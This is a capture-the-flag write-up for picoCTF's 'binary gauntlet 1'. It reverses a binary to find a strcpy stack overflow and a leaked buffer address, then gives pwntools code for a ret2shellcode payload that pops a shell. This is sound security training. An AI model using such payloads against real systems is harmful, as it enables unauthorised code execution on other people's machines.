<!--
---
slug: "picoctf-binary-gauntlet-1"
title: "picoCTF — binary gauntlet 1"
date: "2026-07-13"
ctf: "picoCTF"
challenge: "binary gauntlet 1"
difficulty: "beginner"
tags: ["ret2shellcode", "pwn", "buffer overflow"]
tools: ["pwntools", "ghidra"]
summary: "Reversing a binary to find vulnerabilities and overwriting the return address to jump into injected shellcode."
---
-->

# picoCTF — binary gauntlet 1

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | ret2shellcode |
| Topics | Stack buffer overflow |

---

## Reversing Binary with Ghidra

I started by reversing the binary with Ghidra.

The disassembled `main` function defines a 104 byte buffer stored at `rbp - 0x70` and immediately prints its address.

```c
char local_78 [104]
printf("%p\n",local_70);
```

The program then uses `fgets` to read a user input into a 1000 byte buffer, prints and clears the buffer, and then takes another user input into the same buffer.

```c
local_10 = malloc(1000);
fflush(stdout);
fgets(local_10,1000,stdin);
local_10[999] = '\0';
printf(local_10);
fflush(stdout);
fgets(local_10,1000,stdin);
local_10[999] = '\0';
```

The program then uses `strcpy` to copy `local_10` into the smaller `local_70` buffer that we have the address of. `strcpy` does not check the size of the buffer before copying the value, allowing for a buffer overflow.

```c
strcpy(local_70,local_10);
```

---

## Finding the Offset

As mentioned before, Ghidra shows that the `local_70` buffer is stored at `rbp - 0x70` (112 bytes below `rbp`). The `rbp` sits between the buffer and the return address and is 8 bytes in size. Hence, the total offset is 112 + 8 = **120** bytes.

---

## Writing the Exploit

The goal of the exploit is to fill the `local_70` buffer with shellcode to pop a shell on the server running the binary, and replace the saved return address on the stack with the address of `local_70` to execute this shellcode.

I used `pwntools` to write my exploit.

I started by saving the buffer address printed when the binary starts running.

```python
leak = p.recvline()
buffer_addr = int(leak.strip(), 16)
buffer_addr = p64(buffer_addr)
```

I then use the `pwntools` function `shellcraft.sh()` to save the shellcode needed to pop a shell, and save its length for calculating the offset.

```python
shellcode = asm(shellcraft.sh())
padding_len = offset - len(shellcode)
```

I then create my payload with these parts.

```python
payload = shellcode + b'A'*padding_len + buffer_addr
```

Lastly, I input an arbitrary value, wait for it to be printed, and input my payload.

```python
p.sendline(b"Hello")
p.recvuntil(b"Hello")
p.sendline(payload)
```

This pops a shell on the server running the binary, allowing me to `cat flag.txt` to get the flag.

---

## What I learned

- **Methodology of ret2shellcode challenges** This was my first ret2shellcode challenge. I learned the basic process of *1. finding the buffer's leaked address*, *2. writing shellcode into the buffer*, and *3. returning to this buffer's leaked address*.
- **Using pwntools to pop a shell** This was my first time using pwntools functions to insert shellcode.

---

## References

- [picoCTF - binary gauntlet 1](https://learn.cylabacademy.org/library/126?page=1&workspace=true)